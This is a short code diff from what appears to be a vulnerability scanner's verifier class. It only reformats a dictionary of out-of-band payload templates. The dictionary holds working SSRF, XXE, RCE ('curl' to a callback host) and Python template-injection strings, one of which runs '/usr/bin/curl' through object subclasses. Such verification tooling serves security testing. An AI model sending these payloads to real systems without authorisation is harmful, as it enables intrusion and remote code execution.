@@ -680,7 +680,10 @@ class AdvancedVerifier:
             "ssrf": f"http://{token.callback_url}",
             "xxe": f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://{token.callback_url}'>]>",
             "rce": f"curl http://{token.callback_url}",
-            "ssti": f"{{{{''.__class__.__mro__[2].__subclasses__()[40]('/usr/bin/curl http://{token.callback_url}').read()}}}}",
+            "ssti": (  # noqa: E501
+                f"{{{{''.__class__.__mro__[2].__subclasses__()[40]"
+                f"('/usr/bin/curl http://{token.callback_url}').read()}}}}"
+            ),
         }
 
         payload = payload_templates.get(
